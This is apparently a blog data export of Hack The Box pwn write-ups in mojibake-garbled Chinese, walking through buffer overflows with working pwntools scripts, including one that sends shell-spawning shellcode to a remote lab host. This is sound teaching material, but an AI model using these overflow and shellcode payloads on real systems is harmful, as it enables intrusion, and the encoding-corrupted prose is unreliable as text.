è€Œä¸”å®ƒä¼šè‡ªåŠ¨æŠŠJMP_RSIçš„å€¼è½¬æˆå°ç«¯åºï¼ˆLiitle-Endianï¼‰ï¼Œä¸éœ€è¦æˆ‘ä»¬é¢å¤–ä½¿ç”¨p64()å‡½æ•°ã€‚ å½“ç¨‹åºæ‰§è¡Œretæ—¶ï¼ŒRIPè¢«æ”¹æˆJMP_RSIï¼ŒCPUå¼€å§‹æ‰§è¡Œjmp rsiã€‚è¿™æ¡æŒ‡ä»¤çš„å«ä¹‰æ˜¯ï¼šè·³åˆ°RSIæŒ‡å‘çš„åœ°å€ç»§ç»­æ‰§è¡Œã€‚æ­¤æ—¶RSIé‡Œè¿˜ä¿ç•™ç€åˆšæ‰ç¼“å†²åŒºçš„åœ°å€ï¼Œæ‰€ä»¥ä¼šè·³è½¬åˆ°ç¼“å†²åŒºçš„å¼€å¤´æ‰§è¡Œæˆ‘ä»¬æ”¾åœ¨é‡Œé¢çš„shellcodeã€‚ Windowså› ä¸ºåœ¨Windowsé‡Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨ 1next(elf.search(asm(&#x27;jmp rsi&#x27;))) è¿™ä¸ªå‘½ä»¤ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨æŸ¥æ‰¾jmp rsiçš„åœ°å€ã€‚ è¿™é‡Œä»‹ç»3ç§æ–¹æ³•ï¼š 1. åœ¨ä¸»é¡µé¢å°±å¯ä»¥ç›´æ¥æŸ¥çœ‹ã€‚ç”¨é¼ æ ‡ç‚¹å‡» 1jmp rsi è¿™è¡Œå‘½ä»¤ï¼Œç„¶åä¼šåœ¨é¡µé¢ä¸‹æ–¹çœ‹åˆ°åœ°å€ï¼š 2. ä½¿ç”¨å¿«æ·é”®Alt+tæœç´¢ 1rsi æˆ–è€… 1jmp rsi ï¼ˆæ³¨æ„æ˜¯5ä¸ªç©ºæ ¼ï¼Œå¤šäº†å°‘äº†éƒ½æœä¸å‡ºæ¥ã€‚ï¼‰ 3. ç‚¹å‡»å·¦ä¸Šè§’çš„èœå•Viewï¼Œç„¶åä¾æ¬¡é€‰æ‹©Open subviewsé‡Œçš„Disassemblyï¼š å†å¾€ä¸‹ç¿»æ‰‹åŠ¨æŸ¥æ‰¾åˆ°ï¼š ç¡®å®šåœ°å€äº†ä¹‹åå‰©ä¸‹çš„å°±å’Œä¹‹å‰çš„ä¸€æ ·äº†ï¼š 123456789101112131415161718192021222324252627from pwn import *r = remote(&quot;94.237.51.163&quot;,52671)# æ˜ç¡®è®¾ç½®æ¶æ„å’Œ OS å¹³å°ï¼Œå¦åˆ™asm(shellcraft.sh())ä¼šå‡ºé—®é¢˜ï¼ˆå†™çš„å†…å®¹ä¼šæ˜¯windowsæ¶æ„ä¸‹çš„å‘½ä»¤ï¼‰ã€‚context.arch = &#x27;amd64&#x27;context.os = &#x27;linux&#x27;# æ‰¾åˆ°çš„ jmp rsi æŒ‡ä»¤åœ°å€JMP_RSI = 0x401041# æ„é€  payloadï¼šshellcode + æº¢å‡º + jmp rsi åœ°å€payload = flat(&#123; 0: asm(shellcraft.sh()), # shellcode 256: JMP_RSI # æº¢å‡º return address&#125;)r.sendlineafter(b&#x27;days?\\n&#x27;, payload)r.interactive()# [*] Switching to interactive mode# ls# core# flag.txt# regularity# cat flag.txt# HTB&#123;jMp_rSi_jUmP_aLl_tH3_w4y!&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"HTB Getting_Started Writeup","slug":"CTF/Pwn/HTB-Getting-Started-Writeup","date":"2025-06-10T11:56:50.000Z","updated":"2025-06-10T19:03:24.626Z","comments":true,"path":"2025/06/10/CTF/Pwn/HTB-Getting-Started-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/10/CTF/Pwn/HTB-Getting-Started-Writeup/","excerpt":"é€šè¿‡Buffer Overflowæ¥ä¿®æ”¹ç›®æ ‡å˜é‡çš„å€¼ã€‚","text":"é¢˜ç›® è§‚å¯Ÿåˆ†æç”¨IDAæ‰“å¼€æ–‡ä»¶ï¼š æ³¨æ„åˆ°è¿™é“é¢˜æœ€æ ¸å¿ƒçš„æ¼æ´ï¼š 1__isoc99_scanf(&amp;unk_26E1, s); åŸæœ¬åªç»™såˆ†é…äº†8ä½çš„ç¼“å†²åŒºï¼ˆchar s[8];ï¼‰ï¼Œè€Œscanfæ˜¯æ²¡æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨Buffer Overflowã€‚ æŸ¥çœ‹win()å‡½æ•°ï¼š å‘ç°ä¼šç›´æ¥è¯»å–flagã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯ç»•è¿‡è¿™ä¸ªifæ£€æµ‹ï¼š 1234if ( v25 == 3735928559LL ) putchar(32);else win(); é€šè¿‡Buffer Overflowè¦†ç›–æ‰v25çš„å€¼å³å¯ã€‚ æœ€åå†æ¥æŸ¥çœ‹ä¸€ä¸‹å½“å‰main()å‡½æ•°çš„Stackç»“æ„ï¼ˆç›´æ¥ç‚¹å‡»v25ï¼‰ï¼š å‘ç°ä»såˆ°v24ä¸€å…±æœ‰40ä½ï¼ˆ=-0x08 - (-0x30) = -8 + 3*16 = -8 + 48ï¼‰ï¼Œè€Œv25ä¸€å…±å 8ä½ã€‚ Exploitè¿™é“é¢˜å®ƒç»™äº†ä¸€ä¸ªpythonçš„æ¨¡æ¿ã€‚ 12345678910111213141516171819202122232425#!/usr/bin/python3.8&#x27;&#x27;&#x27;You need to install pwntools to run the script.To run the script: python3 ./wrapper.py&#x27;&#x27;&#x27;# Libraryfrom pwn import *# Open connectionIP = &#x27;94.237.57.57&#x27; # Change thisPORT = 52438 # Change thisr = remote(IP, PORT)# Craft payloadpayload = b&#x27;A&#x27; *(3*16-8) # Change the number of &quot;A&quot;s è¦†ç›–äº†s,v21,v22,v23,v24payload += b&quot;B&quot; * 8 # è¦†ç›–v25# Send payloadr.sendline(payload)# Read flagsuccess(f&#x27;Flag --&gt; &#123;r.recvline_contains(b&quot;HTB&quot;).strip().decode()&#125;&#x27;)# [+] Flag --&gt; HTB&#123;b0f_tut0r14l5_4r3_g00d&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"HTB Questionnaire Writeup","slug":"CTF/Pwn/HTB-Questionnaire-Writeup","date":"2025-06-09T18:43:50.000Z","updated":"2025-06-10T19:04:03.242Z","comments":true,"path":"2025/06/09/CTF/Pwn/HTB-Questionnaire-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/HTB-Questionnaire-Writeup/","excerpt":"ä¸€äº›å…³äºPwnçš„åŸºç¡€çŸ¥è¯†ã€‚ï¼ˆåŒ…æ‹¬ä¸€äº›pwnå¸¸ç”¨çš„Linuxå‘½ä»¤ï¼‰","text":"é¢˜ç›® 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/*This is not the challenge, just a template to answer the questions.To get the flag, answer the questions. There is no bug in the questionnaire.*/void gg()&#123; system(&quot;cat flag.txt&quot;);&#125;void vuln()&#123; char buffer[0x20] = &#123;0&#125;; fprintf(stdout, &quot;\\nEnter payload here: &quot;); fgets(buffer, 0x100, stdin);&#125;void main()&#123; vuln();&#125; è¿™é“é¢˜å¹¶ä¸éœ€è¦æˆ‘ä»¬å»exploitä»»ä½•ç¨‹åºï¼Œåªéœ€è¦å›ç­”ä¸€äº›å…³äºè¿™ä¸ªç¨‹åºåŸºç¡€çš„é—®é¢˜ã€‚ è§£ç¬¬ä¸€é¢˜123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263This is a simple questionnaire to get started with the basics.â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ When compiling C/C++ source code in Linux, an ELF (Executable and Linkable Format) file is created. â—‰â—‰ The flags added when compiling can affect the binary in various ways, like the protections. â—‰â—‰ Another thing affected can be the architecture and the way it&#x27;s linked. â—‰â—‰ â—‰â—‰ If the system in which the challenge is compiled is x86_64 and no flag is specified, â—‰â—‰ the ELF would be x86-64 / 64-bit. If it&#x27;s compiled with a flag to indicate the system, â—‰â—‰ it can be x86 / 32-bit binary. â—‰â—‰ â—‰â—‰ To reduce its size and make debugging more difficult, the binary can be stripped or not stripped. â—‰â—‰ â—‰â—‰ Dynamic linking: â—‰â—‰ â—‰â—‰ A pointer to the linked file is included in the executable, and the file contents are not included â—‰â—‰ at link time. These files are used when the program is run. â—‰â—‰ â—‰â—‰ Static linking: â—‰â—‰ â—‰â—‰ The code for all the routines called by your program becomes part of the executable file. â—‰â—‰ â—‰â—‰ Stripped: â—‰â—‰ â—‰â—‰ The binary does not contain debugging information. â—‰â—‰ â—‰â—‰ Not Stripped: â—‰â—‰ â—‰â—‰ The binary contains debugging information. â—‰â—‰ â—‰â—‰ The most common protections in a binary are: â—‰â—‰ â—‰â—‰ Canary: A random value that is generated, put on the stack, and checked before that function is â—‰â—‰ left again. If the canary value is not correct-has been changed or overwritten, the application will â—‰â—‰ immediately stop. â—‰â—‰ â—‰â—‰ NX: Stands for non-executable segments, meaning we cannot write and execute code on the stack. â—‰â—‰ â—‰â—‰ PIE: Stands for Position Independent Executable, which randomizes the base address of the binary â—‰â—‰ as it tells the loader which virtual address it should use. â—‰â—‰ â—‰â—‰ RelRO: Stands for Relocation Read-Only. The headers of the binary are marked as read-only. â—‰â—‰ â—‰â—‰ Run the &#x27;file&#x27; command in the terminal and &#x27;checksec&#x27; inside the debugger. â—‰â—‰ â—‰â—‰ The output of &#x27;file&#x27; command: â—‰â—‰ â—‰â—‰ âœ— file test â—‰â—‰ test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, â—‰â—‰ interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429, â—‰â—‰ for GNU/Linux 3.2.0, not stripped. â—‰â—‰ â—‰â—‰ The output of &#x27;checksec&#x27; command: â—‰â—‰ â—‰â—‰ gefâ¤ checksec â—‰â—‰ Canary : âœ˜ â—‰â—‰ NX : âœ“ â—‰â—‰ PIE : âœ˜ â—‰â—‰ Fortify : âœ˜ â—‰â—‰ RelRO : Partial â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ 1234567891011[*] Question number 0x1:Is this a &#x27;32-bit&#x27; or &#x27;64-bit&#x27; ELF? (e.g. 1337-bit)&gt;&gt; 64-bitâ™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  å¯ä»¥ç›´æ¥ç”¨IDAæ‰“å¼€ç¨‹åºå¹¶ä¸”æŸ¥çœ‹Exportsé¡µé¢ï¼Œæ ¹æ®åœ°å€çš„é•¿åº¦åˆ¤æ–­è¿™ä¸ªç¨‹åºæ˜¯32ä½çš„è¿˜æ˜¯64ä½çš„ã€‚è¿™é‡Œçš„æ˜¯64ä½çš„ç¨‹åºã€‚ ç¬¬äºŒé¢˜1234567891011[*] Question number 0x2:What&#x27;s the linking of the binary? (e.g. static, dynamic)&gt;&gt; dynamicâ™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  å¯ä»¥åœ¨linuxé‡Œä½¿ç”¨fileå‘½ä»¤ï¼š 12â””â”€$ file testtest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429, for GNU/Linux 3.2.0, not stripped å¯ä»¥çœ‹åˆ°æ˜¯dynamicçš„ã€‚ dynamically linkedï¼ˆåŠ¨æ€é“¾æ¥ï¼‰æ˜¯æŒ‡ä¸€ä¸ªç¨‹åºåœ¨è¿è¡Œæ—¶æ‰åŠ è½½å®ƒæ‰€ä¾èµ–çš„å…±äº«åº“ï¼ˆé€šå¸¸æ˜¯ .so æ–‡ä»¶ï¼Œä¾‹å¦‚ libc.so.6ï¼‰ã€‚è¿™æ˜¯ç°ä»£ Linux ç³»ç»Ÿä¸­æœ€å¸¸ç”¨çš„é“¾æ¥æ–¹å¼ã€‚ ç¬¬ä¸‰é¢˜1234567891011[*] Question number 0x3:Is the binary &#x27;stripped&#x27; or &#x27;not stripped&#x27;?&gt;&gt; not strippedâ™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  stripped æ˜¯æŒ‡åœ¨ç¼–è¯‘å®Œæˆåï¼Œè°ƒè¯•ç¬¦å·ï¼ˆå‡½æ•°åã€å˜é‡åã€æ®µåç­‰ï¼‰è¢«ç§»é™¤äº†ã€‚ç›®çš„æ˜¯è®©ç¨‹åºæ›´å°ã€æ›´éš¾é€†å‘åˆ†æã€‚ åŒæ ·å¯ä»¥åœ¨è¿™ä¸ªç»“æœé‡Œçœ‹åˆ°ï¼š 12â””â”€$ file testtest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a83587fbda6ad7b1aeee2d59f027a882bf2a429, for GNU/Linux 3.2.0, not stripped åŒæ ·ä¹Ÿå¯ä»¥ç”¨IDAæ¥åˆ¤æ–­ã€‚ç”¨IDAæ‰“å¼€ç¨‹åºåå¦‚æœèƒ½çœ‹åˆ°ç±»ä¼¼äºvuln()ã€gg()ç±»ä¼¼åŸå§‹çš„å‡½æ•°åï¼Œé‚£ä¹ˆè¯´æ˜è¿™ä¸ªç¨‹åºæ˜¯not stripped çš„ã€‚å¦‚æœçœ‹åˆ°sub_400123ã€func_4010a0ä¹‹ç±»çš„å‡½æ•°åï¼Œè¯´æ˜æ˜¯ strippedçš„ã€‚ ç¬¬å››é¢˜1234567891011[*] Question number 0x4:Which protections are enabled (Canary, NX, PIE, Fortify)?&gt;&gt; NXâ™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  å¯ä»¥åœ¨ä¸€å¼€å§‹è¿”å›çš„è¿™é‡Œçœ‹åˆ°ï¼š æˆ–è€…è‡ªå·±ç”¨checksecå‘½ä»¤ï¼š 12345678910â””â”€$ checksec test[*] &#x27;/home/test&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No ç¬¬äº”é¢˜12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ Great job so far! Now it&#x27;s time to see some C code and a binary file. â—‰â—‰ â—‰â—‰ In the pwn_questionnaire.zip there are two files: â—‰â—‰ â—‰â—‰ 1. test.c â—‰â—‰ 2. test â—‰â—‰ â—‰â—‰ The &#x27;test.c&#x27; is the source code and &#x27;test&#x27; is the output binary. â—‰â—‰ â—‰â—‰ Let&#x27;s start by analyzing the code. â—‰â—‰ First of all, let&#x27;s focus on the &#x27;#include &lt;stdio.h&gt;&#x27; line. â—‰â—‰ It includes the &#x27;stdio.h&#x27; header file to use some of the standard functions like &#x27;printf()&#x27;. â—‰â—‰ The same principle applies for the &#x27;#include &lt;stdlib.h&gt;&#x27; line, for other functions like &#x27;system()&#x27;. â—‰â—‰ â—‰â—‰ Now, let&#x27;s take a closer look at: â—‰â—‰ â—‰â—‰ void main()&#123; â—‰â—‰ vuln(); â—‰â—‰ &#125; â—‰â—‰ â—‰â—‰ By default, a binary file starts executing from the &#x27;main()&#x27; function. â—‰â—‰ â—‰â—‰ In this case, &#x27;main()&#x27; only calls another function, &#x27;vuln()&#x27;. â—‰â—‰ The function &#x27;vuln()&#x27; has 3 lines. â—‰â—‰ â—‰â—‰ void vuln()&#123; â—‰â—‰ char buffer[0x20] = &#123;0&#125;; â—‰â—‰ fprintf(stdout, &quot;\\nEnter payload here: &quot;); â—‰â—‰ fgets(buffer, 0x100, stdin); â—‰â—‰ &#125; â—‰â—‰ â—‰â—‰ The first line declares a 0x20-byte buffer of characters and fills it with zeros. â—‰â—‰ The second line calls &#x27;fprintf()&#x27; to print a message to stdout. â—‰â—‰ Finally, the third line calls &#x27;fgets()&#x27; to read 0x100 bytes from stdin and store them to the â—‰â—‰ aformentioned buffer. â—‰â—‰ â—‰â—‰ Then, there is a custom &#x27;gg()&#x27; function which calls the standard &#x27;system()&#x27; function to print the â—‰â—‰ flag. This function is never called by default. â—‰â—‰ â—‰â—‰ void gg()&#123; â—‰â—‰ system(&quot;cat flag.txt&quot;); â—‰â—‰ &#125; â—‰â—‰ â—‰â—‰ Run the &#x27;man &lt;function_name&gt;&#x27; command to see the manual page of a standard function (e.g. man fgets).â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ 123456789101112[*] Question number 0x5:What is the name of the custom function the gets called inside `main()`? (e.g. vulnerable_function())&gt;&gt; vuln()â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  ç¬¬å…­é¢˜1234567891011[*] Question number 0x6:What is the size of the &#x27;buffer&#x27; (in hex or decimal)?&gt;&gt; 0x20â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  åœ¨ä¸€å¼€å§‹ç»™çš„cä»£ç é‡Œå°±å¯ä»¥çœ‹åˆ°ï¼š 12345void vuln()&#123; char buffer[0x20] = &#123;0&#125;; fprintf(stdout, &quot;\\nEnter payload here: &quot;); fgets(buffer, 0x100, stdin);&#125; ä¹Ÿå¯ä»¥æŸ¥çœ‹ç”¨IDAæŸ¥çœ‹è¿™ä¸ªç¨‹åºçš„Stackç»“æ„ï¼š ç‚¹å‡»å˜é‡sï¼š __saved_registerså‰å…¨éƒ½æ˜¯bufferçš„å†…å®¹ï¼Œå³é•¿åº¦ä¸º 10000000000000020 - 0000000000000000 = 0x20 ç¬¬ä¸ƒé¢˜12345[*] Question number 0x7:Which custom function is never called? (e.g. vuln())&gt;&gt; gg() å¯ä»¥çœ‹åˆ°main()å‡½æ•°ä¸­æ²¡æœ‰ç›´æ¥è°ƒç”¨gg()è¿™ä¸ªå‡½æ•°ã€‚ ç¬¬å…«é¢˜12345678910111213141516171819202122232425262728293031â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ Excellent! Now it&#x27;s time to talk about Buffer Overflows. â—‰â—‰ â—‰â—‰ Buffer Overflow means there is a buffer of characters, integers or any other type of variables, â—‰â—‰ and someone inserts into this buffer more bytes than it can store. â—‰â—‰ â—‰â—‰ If the user inserts more bytes than the buffer&#x27;s size, they will be stored somewhere in the memory â—‰â—‰ after the address of the buffer, overwriting important addresses for the flow of the program. â—‰â—‰ This, in most cases, will make the program crash. â—‰â—‰ â—‰â—‰ When a function is called, the program knows where to return because of the &#x27;return address&#x27;. If the â—‰â—‰ player overwrites this address, they can redirect the flow of the program wherever they want. â—‰â—‰ To print a function&#x27;s address, run &#x27;p &lt;function_name&gt;&#x27; inside &#x27;gdb&#x27;. (e.g. p main) â—‰â—‰ â—‰â—‰ gefâ¤ p gg â—‰â—‰ $1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x401176 &lt;gg&gt; â—‰â—‰ â—‰â—‰ To perform a Buffer Overflow in the simplest way, we take these things into consideration. â—‰â—‰ â—‰â—‰ 1. Canary is disabled so it won&#x27;t quit after the canary address is overwritten. â—‰â—‰ 2. PIE is disabled so the addresses of the binary functions are not randomized and the user knows â—‰â—‰ where to return after overwritting the return address. â—‰â—‰ 3. There is a buffer with N size. â—‰â—‰ 4. There is a function that reads to this buffer more than N bytes. â—‰â—‰ â—‰â—‰ Run printf &#x27;A%.0s&#x27; &#123;1..30&#125; | ./test to enter 30*&quot;A&quot; into the program. â—‰â—‰ â—‰â—‰ Run the program manually with &quot;./test&quot; and insert 30*A, then 39, then 40 and see what happens. â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ 1234567891011[*] Question number 0x8:What is the name of the standard function that could trigger a Buffer Overflow? (e.g. fprintf())&gt;&gt; fgets()â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  ç¬¬ä¹é¢˜12345678910111213[*] Question number 0x9:Insert 30, then 39, then 40 &#x27;A&#x27;s in the program and see the output.After how many bytes a Segmentation Fault occurs (in hex or decimal)?&gt;&gt; 40â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  é€šè¿‡Stackçš„ç»“æ„å¯ä»¥ç›´æ¥è®¡ç®—å‡ºæ¥ï¼š 10x20 + 8 = 32 + 8 = 40 ç¬¬åé¢˜123456789101112131415[*] Question number 0xa:What is the address of &#x27;gg()&#x27; in hex? (e.g. 0x401337)&gt;&gt; 0x401176â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ Great job! It&#x27;s high time you solved your first challenge! Here is the flag!HTB&#123;l34rn_th3_b451c5_b3f0r4_u_5t4rt&#125; åœ¨Exporté¡µé¢å°±å¯ä»¥ç›´æ¥æŸ¥çœ‹äº†ï¼š","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"HTB You_know_0xDiablos Writeup","slug":"CTF/Pwn/HTB-You-know-0xDiablos-Writeup","date":"2025-06-09T16:10:40.000Z","updated":"2025-08-18T21:57:19.218Z","comments":true,"path":"2025/06/09/CTF/Pwn/HTB-You-know-0xDiablos-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/09/CTF/Pwn/HTB-You-know-0xDiablos-Writeup/","excerpt":"é€šè¿‡Buffer Overflowä¿®æ”¹è¿”å›åœ°å€ä»¥è°ƒç”¨ç›®æ ‡å‡½æ•°å¹¶ä¼ é€’å‚æ•°ã€‚","text":"é¢˜ç›® è§‚å¯Ÿç”¨IDAæ‰“å¼€æ–‡ä»¶ï¼š æŸ¥çœ‹vuln()å‘ç°gets()æ¼æ´ï¼š é™¤æ­¤ä¹‹å¤–å¹¶æ²¡æœ‰åˆ«çš„å‘ç°äº†ï¼Œæ‰€ä»¥æŸ¥çœ‹Exportsï¼š å‘ç°ä¸€ä¸ªå¾ˆå¯ç–‘çš„flagå‡½æ•°ï¼š å‘ç°åªè¦è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ä¼ é€’äº†åˆé€‚çš„å‚æ•°ä¾¿å¯ä»¥ç›´æ¥è·å¾—flagã€‚ æœ€åå†æ¥æŸ¥çœ‹ä¸€ä¸‹vuln()çš„Stackçš„ç»“æ„ï¼š ï¼ˆä¸Šé¢æ˜¯180ä½çš„sï¼‰ ä»¥åŠflagçš„Stackçš„ç»“æ„ï¼š æ³¨æ„åˆ° 1+0000000000000000 _DWORD __saved_registers; 